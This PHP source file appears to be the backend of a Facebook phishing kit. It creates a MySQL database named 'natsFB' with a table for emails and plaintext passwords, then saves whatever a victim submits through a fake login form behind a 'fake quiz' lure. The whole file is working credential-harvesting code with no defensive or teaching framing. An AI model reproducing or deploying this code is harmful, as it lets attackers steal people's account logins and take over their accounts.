{
	header('location: index.php?quiz_id=');
}
$MYSQL_HOST = 'localhost';
$MYSQL_DB = 'natsFB';
$MYSQL_PASSWORD = '';
$MYSQL_USER = 'root';

$fake_quiz = $_GET['quiz_id'];

try
{
	$connection = new PDO("mysql:host={$MYSQL_HOST};",$MYSQL_USER,$MYSQL_PASSWORD);
	$connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	$connection->query("CREATE DATABASE IF NOT EXISTS `{$MYSQL_DB}`");
	$connection->query("USE `$MYSQL_DB`");
	$connection->query("CREATE TABLE IF NOT EXISTS `fbDATA` (
		`fbDATA_id` int(11) NOT NULL AUTO_INCREMENT,
		`fbDATA_email` varchar(255) COLLATE utf8_bin NOT NULL,
		`fbDATA_password` char(64) COLLATE utf8_bin NOT NULL,
		`fbDATA_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
		PRIMARY KEY (`fbDATA_id`)
		) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;");
	}catch(PDOException $e)
	{
		echo $e->getMessage();
	}

class natsFB
{
	protected $db;
	
	public function __construct($connection)
	{
		$this->db = $connection;
	}
	public function SaveData($email,$password)
	{
		$SQL = $this->db->prepare("INSERT INTO fbDATA (fbDATA_email,fbDATA_password) VALUES (:email,:password)");
		$SQL->bindParam(':email',$email);
		$SQL->bindParam(':password',$password);
		$SQL->execute();
	}
}

$natixx = new natsFB($connection);

if(isset($_POST['natixxSEND']))
{
	$email = $_POST['email'];
	$password = $_POST['pass'];
	$natixx->SaveData($email,$password);
}

